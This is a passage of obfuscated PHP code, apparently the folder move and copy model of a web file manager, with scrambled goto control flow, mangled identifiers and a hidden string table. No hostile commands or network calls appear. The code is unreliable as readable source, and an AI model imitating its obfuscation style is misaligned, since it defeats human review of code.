array($Bê¹Â÷êê[512], $B¬†Ù¤±ˆ, 0)); goto BÅªŒ¬µ¨Ù; dÕ«‹ì ğ×: $CêÇøŸ‰ù£ = $this->sourceInfo($CÊÆÛÍË§‡); foreach ($a™šÆºœ× as $dà§´ùö³‡) { $cÁŞæºæØ = $this->_makeItemData($dà§´ùö³‡, $CêÇøŸ‰ù£, $dà§´ùö³‡[$Bê¹Â÷êê[28]]); $cÁŞæºæØ[$Bê¹Â÷êê[461]] = $dà§´ùö³‡[$Bê¹Â÷êê[461]]; $c‹Ÿ¨£›—[] = $cÁŞæºæØ; } $this->chunkEventSet($Bê¹Â÷êê[513], array($Bê¹Â÷êê[514], $B¬†Ù¤±ˆ, $eâªĞØ²ì—)); goto c—¥ÖŠ‡“È; AÎ«ÂË·÷: $Bê¹Â÷êê =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d”ãŞèá = $this->sourceInfoCache($eîÓñ§‹Â¼); $A…ç¤ÀŒÛ¨ = $this->sourceInfoCache($dª¿¨Ó¢÷½); goto c¥ç²Ë”®¥; eÁÇ…µ­¨’: } private function _childrenMakeRelation($bæ®«¼¦­Í, $a›—ª°Ãß») { $E©°š·Í— =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e‘ˆÌÓã = array(); $e–ø˜ÜÌœ = array(); foreach ($bæ®«¼¦­Í as $CÖØÜ ç½Ò) { $dó·ˆÏŒï = $CÖØÜ ç½Ò[$E©°š·Í—[28]] . $E©°š·Í—[8] . $CÖØÜ ç½Ò[$E©°š·Í—[461]]; $e‘ˆÌÓã[$dó·ˆÏŒï] = $CÖØÜ ç½Ò[$E©°š·Í—[369]]; } foreach ($a›—ª°Ãß» as $CÖØÜ ç½Ò) { $dó·ˆÏŒï = $CÖØÜ ç½Ò[$E©°š·Í—[28]] . $E©°š·Í—[8] . $CÖØÜ ç½Ò[$E©°š·Í—[461]]; $C»‘—µÆÀ = $e‘ˆÌÓã[$dó·ˆÏŒï]; $e–ø˜ÜÌœ[$C»‘—µÆÀ] = $CÖØÜ ç½Ò[$E©°š·Í—[369]]; } return $e–ø˜ÜÌœ; } private function _childrenMatch($CñŞß‹ñÂÛ, $Bë´µ‹êï, $dó¦¦¾‹¿) { goto dæ°‡£Ë§¼; dæ°‡£Ë§¼: $E¨“×™¥£‰ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Bº¨ùÅâšË = $dó¦¦¾‹¿[$E¨“×™¥£‰[461]]; $fÔá³£İï = $this->parentLevelArray($Bë´µ‹êï[$E¨“×™¥£‰[461]]); goto céµ†ö—íÇ; d‘Éî£¢Õö: $A´ÏŞ³¢Ãå = $eê‹ÉÒƒ¨¢[count($eê‹ÉÒƒ¨¢) - 1]; return array($E¨“×™¥£‰[463] => $A´ÏŞ³¢Ãå, $E¨“×™¥£‰[461] => $Bº¨ùÅâšË); goto B¬Ëğ‚‹…; céµ†ö—íÇ: foreach ($fÔá³£İï as $cöÔÙÊÆé) { if (isset($CñŞß‹ñÂÛ[$cöÔÙÊÆé])) { $Bº¨ùÅâšË .= $CñŞß‹ñÂÛ[$cöÔÙÊÆé] . $E¨“×™¥£‰[519]; } } $Bº¨ùÅâšË = rtrim($Bº¨ùÅâšË, $E¨“×™¥£‰[47]) . $E¨“×™¥£‰[47]; $eê‹ÉÒƒ¨¢ = $this->parentLevelArray($Bº¨ùÅâšË); goto d‘Éî£¢Õö; B¬Ëğ‚‹…: } private function _makeItemData($C ÖºÆÉ¿×, $bÛ“š„·, $eØğğ¢Ÿ½) { $C˜Ğ™óì‰ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bœÔˆºöµÇ = array($C˜Ğ™óì‰[520] => $C ÖºÆÉ¿×[$C˜Ğ™óì‰[370]], $C˜Ğ™óì‰[386] => $eØğğ¢Ÿ½, $C˜Ğ™óì‰[521] => $C ÖºÆÉ¿×[$C˜Ğ™óì‰[372]], $C˜Ğ™óì‰[420] => $C ÖºÆÉ¿×[$C˜Ğ™óì‰[419]], $C˜Ğ™óì‰[522] => $C ÖºÆÉ¿×[$C˜Ğ™óì‰[77]], $C˜Ğ™óì‰[523] => $bÛ“š„·[$C˜Ğ™óì‰[371]], $C˜Ğ™óì‰[524] => $bÛ“š„·[$C˜Ğ™óì‰[458]], $C˜Ğ™óì‰[525] => USER_ID, $C˜Ğ™óì‰[526] => USER_ID, $C˜Ğ™óì‰[368] => $bÛ“š„·[$C˜Ğ™óì‰[369]], $C˜Ğ™óì‰[527] => $bÛ“š„·[$C˜Ğ™óì‰[461]] . $bÛ“š„·[$C˜Ğ™óì‰[369]] . $C˜Ğ™óì‰[47], $C˜Ğ™óì‰[396] => 0, $C˜Ğ™óì‰[528] => $C˜Ğ™óì‰[33]); return $bœÔˆºöµÇ; } private function _copyApplyMeta($D´İ²Ş·, &$e¾ˆìßÇ³‡) { $a–ˆ´õˆ„Ÿ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e¿Í‡˜ë½¿ = $D´İ²Ş·[$a–ˆ´õˆ„Ÿ[369]]; $bˆ¿¡‰£Ä® = $D´İ²Ş·[$a–ˆ´õˆ„Ÿ[28]]; if (!isset($D´İ²Ş·[$a–ˆ´õˆ„Ÿ[529]]) || !$D´İ²Ş·[$a–ˆ´õˆ„Ÿ[529]] || $D´İ²Ş·[$a–ˆ´õˆ„Ÿ[529]] == $a–ˆ´õˆ„Ÿ[470]) { $e¾ˆìßÇ³‡[$a–ˆ´õˆ„Ÿ[505]][] = array($a–ˆ´õˆ„Ÿ[369], $e¿Í‡˜ë½¿, $a–ˆ´õˆ„Ÿ[529], short_id($e¿Í‡˜ë½¿)); } if (Input::check($bˆ¿¡‰£Ä®, $a–ˆ´õˆ„Ÿ[530])) { $e¾ˆìßÇ³‡[$a–ˆ´õˆ„Ÿ[504]][] = array($a–ˆ´õˆ„Ÿ[369] => $e¿Í‡˜ë½¿, $a–ˆ´õˆ„Ÿ[89] => $a–ˆ´õˆ„Ÿ[416], $a–ˆ´õˆ„Ÿ[359] => str_replace($a–ˆ´õˆ„Ÿ[50], $a–ˆ´õˆ„Ÿ[33], Pinyin::encode($bˆ¿¡‰£Ä®))); $e¾ˆìßÇ³‡[$a–ˆ´õˆ„Ÿ[504]][] = array($a–ˆ´õˆ„Ÿ[369] => $e¿Í‡˜ë½¿, $a–ˆ´õˆ„Ÿ[89] => $a–ˆ´õˆ„Ÿ[415], $a–ˆ´õˆ„Ÿ[359] => Pinyin::encode($bˆ¿¡‰£Ä®, $a–ˆ´õˆ„Ÿ[531])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($dœöÙîºÀß) { goto fçÈñÚÏÙ²; fçÈñÚÏÙ²: $CŠ¿Ÿ—°ïŒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C¶š‡‘¾« = $this->sourceInfo($dœöÙîºÀß); $b²Ş„Ï³º = $CŠ¿Ÿ—°ïŒ[532]; goto f‰Ì—´ÃÙË; f‰Ì—´ÃÙË: $b‰š ˜á¤ = array($CŠ¿Ÿ—°ïŒ[461] => array($CŠ¿Ÿ—°ïŒ[485], $C¶š‡‘¾«[$CŠ¿Ÿ—°ïŒ[461]] . $dœöÙîºÀß . $CŠ¿Ÿ—°ïŒ[486]), $CŠ¿Ÿ—°ïŒ[397] => $this->targetIsDelete); $e§¶®°¯§ = $this->field($b²Ş„Ï³º)->where($b‰š ˜á¤)->select(); if (!$e§¶®°¯§) { return; } goto a“ë»Ëé„; a“ë»Ëé„: $e§¶®°¯§ = array_to_keyvalue($e§¶®°¯§, $CŠ¿Ÿ—°ïŒ[369]); foreach ($e§¶®°¯§ as $CÇâÈù™£) { $b¯ÕÜÅĞøá = $CÇâÈù™£[$CŠ¿Ÿ—°ïŒ[463]]; $dœöÙîºÀß = $CÇâÈù™£[$CŠ¿Ÿ—°ïŒ[369]]; if (!isset($this->_childrenListCache[$dœöÙîºÀß]) && $CÇâÈù™£[$CŠ¿Ÿ—°ïŒ[370]] == $CŠ¿Ÿ—°ïŒ[83]) { $this->_childrenListCache[$dœöÙîºÀß] = array(); } if (!isset($this->_childrenListCache[$b¯ÕÜÅĞøá])) { $this->_childrenListCache[$b¯ÕÜÅĞøá] = array(); } $this->_childrenListCache[$b¯ÕÜÅĞøá][$dœöÙîºÀß] = $CÇâÈù™£; $this->_childrenItemCache[$dœöÙîºÀß] = $CÇâÈù™£; } goto bØÂ¬Ó‚‰Û; bØÂ¬Ó‚‰Û: } private function _childrenListAll($dğ“²¡¨İÏ, &$f¹ôÔó¹÷) { $DÕÚÊªÍæ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!isset($this->_childrenListCache[$dğ“²¡¨İÏ])) { return; } $fÜÄ¬—Ëâ‚ = $this->_childrenListCache[$dğ“²¡¨İÏ]; foreach ($fÜÄ¬—Ëâ‚ as $Cˆ½§¹¡« => $AÅ‚‡Ã…Õ) { $f¹ôÔó¹÷[$Cˆ½§¹¡«] = $AÅ‚‡Ã…Õ; if ($AÅ‚‡Ã…Õ[$DÕÚÊªÍæ[370]] == $DÕÚÊªÍæ[83]) { $this->_childrenListAll($Cˆ½§¹¡«, $f¹ôÔó¹÷); } } } private function sourceInfoCache($Eê«ÛÃÛÊ¢) { if (isset($this->_childrenItemCache[$Eê«ÛÃÛÊ¢])) { return $this->_childrenItemCache[$Eê«ÛÃÛÊ¢]; } return $this->sourceInfo($Eê«ÛÃÛÊ¢); } private function _childrenList($F£“èâÅ‚á) { if (isset($this->_childrenListCache[$F£“èâÅ‚á])) { return $this->_childrenListCache[$F£“èâÅ‚á]; } return $this->_childrenListSelect($F£“èâÅ‚á); } private function _childrenListSelect($E’ŞšØ†‹Õ) { goto EÕ˜ˆŞÒº; EÕ˜ˆŞÒº: $DÛ«Ù¸ôÌ… =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dŒ¶ôøêĞ = array($DÛ«Ù¸ôÌ…[463] => $E’ŞšØ†‹Õ, $DÛ«Ù¸ôÌ…[397] => $this->targetIsDelete); $bŒŸÔ·ß©¡ = $this->where($dŒ¶ôøêĞ)->select(); goto Dƒİ ¾¼ø ; Dƒİ ¾¼ø : $bŒŸÔ·ß©¡ = $bŒŸÔ·ß©¡ ? $bŒŸÔ·ß©¡ : array(); $Aº¼ˆ¸¥‡ = array_to_keyvalue($bŒŸÔ·ß©¡, $DÛ«Ù¸ôÌ…[369]); $this->_childrenListCache[$E’ŞšØ†‹Õ] = $Aº¼ˆ¸¥‡; goto dë¶İó£‚‚; dë¶İó£‚‚: foreach ($Aº¼ˆ¸¥‡ as $E’ŞšØ†‹Õ => $aß…ìŒÀìî) { $this->_childrenItemCache[$E’ŞšØ†‹Õ] = $aß…ìŒÀìî; } return $Aº¼ˆ¸¥‡; goto FâñŠÁ§ªØ; FâñŠÁ§ªØ: } private function fileNameExistCache($eêØ›Á‚˜, $EßÇ¾©´‡º) { $A–ÆÀæ’„è =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EßÇ¾©´‡º = strtolower($EßÇ¾©´‡º); $dã‘çôğçØ = $this->_childrenList($eêØ›Á‚˜); foreach ($dã‘çôğçØ as $eÆ‚›ö¸£‡) { if ($EßÇ¾©´‡º == strtolower($eÆ‚›ö¸£‡[$A–ÆÀæ’„è[28]])) { return $eÆ‚›ö¸£‡[$A–ÆÀæ’„è[369]]; } } return !1; } private function fileNameAutoCache($a‡Ô…·İì, $F†ŞàŞ’Û, $e›ŸŸ¾Ğ, $b¤˜ÜƒéÔ¢) { $cƒ³ÓÍÇ´¼ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e†µÆ±ë¥ñ = $this->_childrenList($a‡Ô…·İì); $E¼Ò‚¨åƒ = array_to_keyvalue($e†µÆ±ë¥ñ, $cƒ³ÓÍÇ´¼[33], $cƒ³ÓÍÇ´¼[28]); return $this->fileNameAutoGet($E¼Ò‚¨åƒ, $F†ŞàŞ’Û, $e›ŸŸ¾Ğ, $b¤˜ÜƒéÔ¢); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($fÂ±Î¼Á„, $A¢ßñİ§İÚ, $B…À¶ÑÑá = REPEAT_REPLACE, $EƒšÁ‰ºñ = '') { goto eªŒ«Ï™Ÿ; eõ››Ä¯Ÿ: if (!$b–ÓÀ‰¢  || !$A–’½†à¯ || $A–’½†à¯[$A´ö„×‰õ [370]] != $A´ö„×‰õ [83]) { return !1; } Hook::trigger($A´ö„×‰õ [533], $a­¾Š©åä); $this->targetIsDelete = intval($b–ÓÀ‰¢ [$A´ö„×‰õ [397]]); goto Dó’ ö¡º³; eÛ¼Ğµîîê: $this->updateModifyTime($B–ì¥­Æ¤ù); Model($A´ö„×‰õ [507])->eventMove($fÂ±Î¼Á„, $b–ÓÀ‰¢ [$A´ö„×‰õ [463]], $A¢ßñİ§İÚ); Hook::trigger($A´ö„×‰õ [534], $a­¾Š©åä); goto d‡Ñ›½†¥¾; cˆ£ñÃÉ¥Ò: $this->lockWriteStart($A¢ßñİ§İÚ, $E¼Ó·ååä’); $eÂèô¨œß = array($A´ö„×‰õ [503] => array(), $A´ö„×‰õ [535] => !1); $this->clearShare($fÂ±Î¼Á„, $A¢ßñİ§İÚ); goto FÍ—¹‡­Ì•; FÆÒ…§õŒ¡: $this->lockMoveEnd($fÂ±Î¼Á„); $this->lockWriteEnd($A¢ßñİ§İÚ, $E¼Ó·ååä’); $this->folderSizeReset($b–ÓÀ‰¢ [$A´ö„×‰õ [463]]); goto f ¹½­¨; Dó’ ö¡º³: if ($b–ÓÀ‰¢ [$A´ö„×‰õ [463]] == $A¢ßñİ§İÚ && $EƒšÁ‰ºñ != $b–ÓÀ‰¢ [$A´ö„×‰õ [28]]) { $eÔÈœÈä³» = $this->fileNameExist($A¢ßñİ§İÚ, $EƒšÁ‰ºñ); if ($eÔÈœÈä³» && $b–ÓÀ‰¢ [$A´ö„×‰õ [370]] == $A´ö„×‰õ [470]) { goto EÂ»£ßÅ ; eøƒ½Óİç“: return $eÔÈœÈä³»; goto B…Éèè¿Í; Fºé‚Õ‹×º: $this->removeNow($fÂ±Î¼Á„, !1); $this->folderSizeReset($A¢ßñİ§İÚ); Hook::trigger($A´ö„×‰õ [534], $a­¾Š©åä); goto eøƒ½Óİç“; EÂ»£ßÅ : $fº³¥ôÄ = $this->sourceInfo($eÔÈœÈä³»); $d‡™£ˆ„ƒª = $this->fileHistory($fº³¥ôÄ, $b–ÓÀ‰¢ [$A´ö„×‰õ [419]], $b–ÓÀ‰¢ [$A´ö„×‰õ [77]]); if (!$d‡™£ˆ„ƒª) { Model($A´ö„×‰õ [422])->remove($b–ÓÀ‰¢ [$A´ö„×‰õ [419]]); } goto Fºé‚Õ‹×º; B…Éèè¿Í: } } $E¼Ó·ååä’ = $EƒšÁ‰ºñ ? $EƒšÁ‰ºñ : $b–ÓÀ‰¢ [$A´ö„×‰õ [28]]; $this->lockMoveStart($fÂ±Î¼Á„); goto cˆ£ñÃÉ¥Ò; e†Âš‘‘²: if ($b–ÓÀ‰¢ [$A´ö„×‰õ [370]] == $A´ö„×‰õ [83] && $f”ŒŠŞåõ†) { $this->folderSizeResetChildren($c–ÂÍ˜‡«); } Model($A´ö„×‰õ [167])->linkAdd($eÂèô¨œß[$A´ö„×‰õ [503]]); if ($f”ŒŠŞåõ† && $eÂèô¨œß[$A´ö„×‰õ [535]]) { $this->removeNow($fÂ±Î¼Á„, !1); } goto FÆÒ…§õŒ¡; eªŒ«Ï™Ÿ: $A´ö„×‰õ  =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b–ÓÀ‰¢  = $this->sourceInfo($fÂ±Î¼Á„); $A–’½†à¯ = $this->sourceInfo($A¢ßñİ§İÚ); goto BáĞ…ÁºŠğ; BáĞ…ÁºŠğ: if ($b–ÓÀ‰¢ [$A´ö„×‰õ [463]] == $A–’½†à¯[$A´ö„×‰õ [369]]) { if ($b–ÓÀ‰¢ [$A´ö„×‰õ [397]] == $A´ö„×‰õ [83]) { Model($A´ö„×‰õ [395])->restore(array($fÂ±Î¼Á„)); } return $fÂ±Î¼Á„; } $a­¾Š©åä = $this->pathInfoMore($fÂ±Î¼Á„); if ($this->isParentOf($fÂ±Î¼Á„, $A¢ßñİ§İÚ)) { return !1; } goto eõ››Ä¯Ÿ; f ¹½­¨: $this->folderSizeReset($A¢ßñİ§İÚ); $B–ì¥­Æ¤ù = array($b–ÓÀ‰¢ [$A´ö„×‰õ [463]], $A¢ßñİ§İÚ); if ($b–ÓÀ‰¢ [$A´ö„×‰õ [370]] == $A´ö„×‰õ [83]) { $B–ì¥­Æ¤ù[] = $fÂ±Î¼Á„; } goto eÛ¼Ğµîîê; d‡Ñ›½†¥¾: return $c–ÂÍ˜‡«; goto a—…¡½õ…å; FÍ—¹‡­Ì•: $f”ŒŠŞåõ† = $this->fileNameExistCache($A¢ßñİ§İÚ, $b–ÓÀ‰¢ [$A´ö„×‰õ [28]]); $c–ÂÍ˜‡« = $this->_move($fÂ±Î¼Á„, $A¢ßñİ§İÚ, $B…À¶ÑÑá, $eÂèô¨œß, $EƒšÁ‰ºñ); $this->sourceCacheClear(); goto e†Âš‘‘²; a—…¡½õ…å: } private function _move($a‹µ¸Úä„é, $C‡›ñ¬Ñ», $E®æÄ«–Ò, &$bŸš«¹ô, $d£Î»êò¤ = '') { goto e˜ï’Ãî’; C–Ö‹Ï»Ø¬: $Eç¸ªÛµŸ¢ = $d£Î»êò¤ ? $d£Î»êò¤ : $Cô¾²¦Ñƒ¢[$FĞÅ·«Î¯Å[28]]; $FçÇÕİÂëê = $this->fileNameExistCache($C‡›ñ¬Ñ», $Eç¸ªÛµŸ¢); $this->lockMoveStart($a‹µ¸Úä„é); goto a¤§‚ ¶¤¯; e˜ï’Ãî’: $FĞÅ·«Î¯Å =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Cô¾²¦Ñƒ¢ = $this->sourceInfo($a‹µ¸Úä„é); $DÆµ¶ÏòŒ• = $Cô¾²¦Ñƒ¢[$FĞÅ·«Î¯Å[370]] == $FĞÅ·«Î¯Å[83]; goto C–Ö‹Ï»Ø¬; CÛÂß‘Ÿ§‰: $b®ˆÓ…£Ùƒ = !1; if ($DÆµ¶ÏòŒ•) { if ($E®æÄ«–Ò == REPEAT_RENAME_FOLDER) { $Eç¸ªÛµŸ¢ = $this->fileNameAuto($C‡›ñ¬Ñ», $Eç¸ªÛµŸ¢, $E®æÄ«–Ò, $DÆµ¶ÏòŒ•); $f„¦ã¸¶ù = $this->_moveForce($a‹µ¸Úä„é, $C‡›ñ¬Ñ», $Eç¸ªÛµŸ¢); } else { if ($E®æÄ«–Ò == REPEAT_RENAME_FOLDER) { $E®æÄ«–Ò = REPEAT_RENAME; } $dĞ¦ÖŸÍÊ = $this->_childrenListSelect($a‹µ¸Úä„é); foreach ($dĞ¦ÖŸÍÊ as $e›ŸµºƒÜå) { $this->_move($e›ŸµºƒÜå[$FĞÅ·«Î¯Å[369]], $FçÇÕİÂëê, $E®æÄ«–Ò, $bŸš«¹ô); } $b®ˆÓ…£Ùƒ = !0; } } else { if ($E®æÄ«–Ò == REPEAT_SKIP) { $b®ˆÓ…£Ùƒ = !0; } else { if ($E®æÄ«–Ò == REPEAT_RENAME || $E®æÄ«–Ò == REPEAT_RENAME_FOLDER) { $Eç¸ªÛµŸ¢ = $this->fileNameAuto($C‡›ñ¬Ñ», $Eç¸ªÛµŸ¢, $E®æÄ«–Ò, $DÆµ¶ÏòŒ•); $f„¦ã¸¶ù = $this->_moveForce($a‹µ¸Úä„é, $C‡›ñ¬Ñ», $Eç¸ªÛµŸ¢); } else { if ($E®æÄ«–Ò == REPEAT_REPLACE) { $D¶¢Ü¾œÉ = $this->sourceInfoCache($FçÇÕİÂëê); $C‡Ç”ÌÕá = $this->fileHistory($D¶¢Ü¾œÉ, $Cô¾²¦Ñƒ¢[$FĞÅ·«Î¯Å[419]], $Cô¾²¦Ñƒ¢[$FĞÅ·«Î¯Å[77]]); if ($C‡Ç”ÌÕá) { $bŸš«¹ô[$FĞÅ·«Î¯Å[503]][] = $Cô¾²¦Ñƒ¢[$FĞÅ·«Î¯Å[419]]; } else { $b®ˆÓ…£Ùƒ = !0; } } } } } if ($b®ˆÓ…£Ùƒ && !$bŸš«¹ô[$FĞÅ·«Î¯Å[535]]) { $bŸš«¹ô[$FĞÅ·«Î¯Å[535]] = !0; } goto e¸œÕèµÌ¶; a¤§‚ ¶¤¯: $this->lockWriteStart($C‡›ñ¬Ñ», $Eç¸ªÛµŸ¢); if (!$FçÇÕİÂëê) { return $this->_moveForce($a‹µ¸Úä„é, $C‡›ñ¬Ñ», $Eç¸ªÛµŸ¢); } $f„¦ã¸¶ù = $FçÇÕİÂëê; goto CÛÂß‘Ÿ§‰; e¸œÕèµÌ¶: return $f„¦ã¸¶ù; goto CÔ›à×òŠ; CÔ›à×òŠ: } private function _moveForce($b‚ãœ»’£, $e‘°±Ë¤¸, $BÍ»õø—Ú¶) { goto b«¯¶ÒÁ¹²; Aàİ‘à•¥Ä: if (!$bµ«À‡ë£) { Model($C°„ÔĞìŞ[456])->authClear($b‚ãœ»’£); } $fÈ‘Í‡µˆ = $AÁ®š‹ £´[$C°„ÔĞìŞ[397]] == $C°„ÔĞìŞ[83] && $D÷øÜâÒ…[$C°„ÔĞìŞ[397]] != $C°„ÔĞìŞ[83]; if ($fÈ‘Í‡µˆ) { $eÕ¦¹÷·˜[$C°„ÔĞìŞ[396]] = 0; } goto dÑ£½áÅ•; b«¯¶ÒÁ¹²: $C°„ÔĞìŞ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AÁ®š‹ £´ = $this->sourceInfo($b‚ãœ»’£); $D÷øÜâÒ… = $this->sourceInfo($e‘°±Ë¤¸); goto A¤Œó­‰ôã; A¤Œó­‰ôã: $B¾Åùòøè° = $AÁ®š‹ £´[$C°„ÔĞìŞ[370]] == $C°„ÔĞìŞ[83]; $eÕ¦¹÷·˜ = array($C°„ÔĞìŞ[368] => $D÷øÜâÒ…[$C°„ÔĞìŞ[369]], $C°„ÔĞìŞ[527] => $D÷øÜâÒ…[$C°„ÔĞìŞ[461]] . $D÷øÜâÒ…[$C°„ÔĞìŞ[369]] . $C°„ÔĞìŞ[47], $C°„ÔĞìŞ[523] => $D÷øÜâÒ…[$C°„ÔĞìŞ[371]], $C°„ÔĞìŞ[524] => $D÷øÜâÒ…[$C°„ÔĞìŞ[458]], $C°„ÔĞìŞ[526] => USER_ID, $C°„ÔĞìŞ[386] => $BÍ»õø—Ú¶); $bµ«À‡ë£ = $AÁ®š‹ £´[$C°„ÔĞìŞ[371]] == SourceModel::TYPE_GROUP && $D÷øÜâÒ…[$C°„ÔĞìŞ[371]] == SourceModel::TYPE_GROUP && $AÁ®š‹ £´[$C°„ÔĞìŞ[458]] == $D÷øÜâÒ…[$C°„ÔĞìŞ[458]]; goto Aàİ‘à•¥Ä; dÑ£½áÅ•: if ($B¾Åùòøè°) { $a…Î¸´Ûæ = array($C°„ÔĞìŞ[527] => array($C°„ÔĞìŞ[485], $AÁ®š‹ £´[$C°„ÔĞìŞ[461]] . $AÁ®š‹ £´[$C°„ÔĞìŞ[369]] . $C°„ÔĞìŞ[486])); $CšÅùéÛª£ = $AÁ®š‹ £´[$C°„ÔĞìŞ[461]] . $AÁ®š‹ £´[$C°„ÔĞìŞ[369]] . $C°„ÔĞìŞ[47]; $bĞÍíãƒ©š = $D÷øÜâÒ…[$C°„ÔĞìŞ[461]] . $D÷øÜâÒ…[$C°„ÔĞìŞ[369]] . $C°„ÔĞìŞ[47] . $AÁ®š‹ £´[$C°„ÔĞìŞ[369]] . $C°„ÔĞìŞ[47]; $aì–°õñÔŞ = array($C°„ÔĞìŞ[527] => array($C°„ÔĞìŞ[536], "\162\x65\x70\154\x61\x63\145\x28\160\x61\162\x65\x6e\164\114\x65\x76\x65\x6c\x2c\47{$CšÅùéÛª£}\47\x2c\47{$bĞÍíãƒ©š}\47\51"), $C°„ÔĞìŞ[523] => $D÷øÜâÒ…[$C°„ÔĞìŞ[371]], $C°„ÔĞìŞ[524] => $D÷øÜâÒ…[$C°„ÔĞìŞ[458]]); if ($fÈ‘Í‡µˆ) { $aì–°õñÔŞ[$C°„ÔĞìŞ[396]] = 0; } $this->where($a…Î¸´Ûæ)->data($aì–°õñÔŞ)->save(); } $this->where(array($C°„ÔĞìŞ[383] => $b‚ãœ»’£))->data($eÕ¦¹÷·˜)->save(); return $b‚ãœ»’£; goto A‹Œ™ºØ•; A‹Œ™ºØ•: } private function clearShare($EÜÍœ‰ÑÆ“, $AÑï²–İèˆ) { goto d÷ïŞø©ÊÈ; eôª†÷—…‡: Model($BÜË‰îâ½à[538])->where($b½İ¡¥‡ç)->save(array($BÜË‰îâ½à[448] => 0)); Model($BÜË‰îâ½à[539])->where($b½İ¡¥‡ç)->delete(); goto e‹Ì–ÏÌæÍ; Cˆâˆ®ä°Æ: if (!$B†­”òªÖê) { return; } $b½İ¡¥‡ç = array($BÜË‰îâ½à[369] => array($BÜË‰îâ½à[7], $B†­”òªÖê), $BÜË‰îâ½à[448] => 1); $d–É·†« = Model($BÜË‰îâ½à[538])->field($BÜË‰îâ½à[441])->where($b½İ¡¥‡ç)->select(); goto EŸ‰İº³ù½; d÷ïŞø©ÊÈ: $BÜË‰îâ½à =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CÏŒéÆàŠÀ = $this->sourceInfo($EÜÍœ‰ÑÆ“); $eÍĞ¡Æë¶ = $this->sourceInfo($AÑï²–İèˆ); goto c¡ÊÔêÈà; EŸ‰İº³ù½: if (!$d–É·†«) { return; } $d–É·†« = array_to_keyvalue($d–É·†«, $BÜË‰îâ½à[33], $BÜË‰îâ½à[441]); $b½İ¡¥‡ç = array($BÜË‰îâ½à[441] => array($BÜË‰îâ½à[7], $d–É·†«)); goto eôª†÷—…‡; c¡ÊÔêÈà: if ($CÏŒéÆàŠÀ[$BÜË‰îâ½à[458]] == $eÍĞ¡Æë¶[$BÜË‰îâ½à[458]] && $CÏŒéÆàŠÀ[$BÜË‰îâ½à[371]] == $BÜË‰îâ½à[537]) { return; } $b½İ¡¥‡ç = array($BÜË‰îâ½à[461] => array($BÜË‰îâ½à[485], $CÏŒéÆàŠÀ[$BÜË‰îâ½à[461]] . $EÜÍœ‰ÑÆ“ . $BÜË‰îâ½à[486])); $B†­”òªÖê = $this->field($BÜË‰îâ½à[383])->where($b½İ¡¥‡ç)->getField($BÜË‰îâ½à[369], !0); goto Cˆâˆ®ä°Æ; e‹Ì–ÏÌæÍ: } public function copyFolderFromIO($d—Ç¹Œöôé, $Eó÷Ÿå±ìê, $FàÃ—”İ§å, $F‡ç¼Â³«, $DÇ†ò”¿´¹, $Dâç‘·ë¿ = false) { goto dŒóâÏäºØ; dŒóâÏäºØ: $BÛÍ‹§õ­ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e‡Ôİ¤‹ùù = array($BÛÍ‹§õ­[504] => array(), $BÛÍ‹§õ­[505] => array(), $BÛÍ‹§õ­[503] => array(), $BÛÍ‹§õ­[540] => array()); $eÍì¡¯á½ = $Dâç‘·ë¿ ? $Dâç‘·ë¿ : $d—Ç¹Œöôé->getPathName($d—Ç¹Œöôé->pathThis($Eó÷Ÿå±ìê)); goto D¬·‰áá«å; dåò§ÅÙÏñ: Model($BÛÍ‹§õ­[506])->addAll($e‡Ôİ¤‹ùù[$BÛÍ‹§õ­[504]], array(), !0); Model($BÛÍ‹§õ­[507])->eventCopy($cšá¥¸ÈôÂ); $this->saveAll($e‡Ôİ¤‹ùù[$BÛÍ‹§õ­[505]]); goto dÖ•·¬ÑË½; A¾›ö³Šõ‚: if ($F‹Ò¨‰“) { $this->_childrenAllMake($F‹Ò¨‰“); } Hook::trigger($BÛÍ‹§õ­[541]); $this->_copyChildTo($d—Ç¹Œöôé, $Eó÷Ÿå±ìê, $cšá¥¸ÈôÂ, $F‡ç¼Â³«, $e‡Ôİ¤‹ùù, $DÇ†ò”¿´¹); goto F‡Œ¥×’¨ã; F‡Œ¥×’¨ã: Hook::trigger($BÛÍ‹§õ­[542]); if ($cšá¥¸ÈôÂ) { $this->folderSizeResetChildren($cšá¥¸ÈôÂ); } $this->_childrenListClear(); goto dåò§ÅÙÏñ; dÖ•·¬ÑË½: Model($BÛÍ‹§õ­[422])->linkAdd($e‡Ôİ¤‹ùù[$BÛÍ‹§õ­[503]]); Model($BÛÍ‹§õ­[422])->remove($e‡Ôİ¤‹ùù[$BÛÍ‹§õ­[540]]); $this->folderSizeReset($FàÃ—”İ§å); goto D©ÛîÚá¾ø; D©ÛîÚá¾ø: $this->updateModifyTime($FàÃ—”İ§å); return $cšá¥¸ÈôÂ; goto c®½¥´…‚; D¬·‰áá«å: $F‹Ò¨‰“ = $this->fileNameExist($FàÃ—”İ§å, $eÍì¡¯á½); $cšá¥¸ÈôÂ = $this->mkdir($FàÃ—”İ§å, $eÍì¡¯á½, $F‡ç¼Â³«); if (!$F‹Ò¨‰“ || $F‡ç¼Â³« == REPEAT_RENAME_FOLDER) { $F‡ç¼Â³« = !1; } goto A¾›ö³Šõ‚; c®½¥´…‚: } private function _copyChildTo($D¶™œ‘²ˆö, $Aåë“ì“ˆø, $e ° ƒ¢·, $b·Ë¯•ÍùÄ, &$D ø»ÇˆÜî, $bµ¤¨¸‚¡) { goto D‹’¡¥‰Êö; D‹’¡¥‰Êö: $e¾‚½÷¯ß =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; 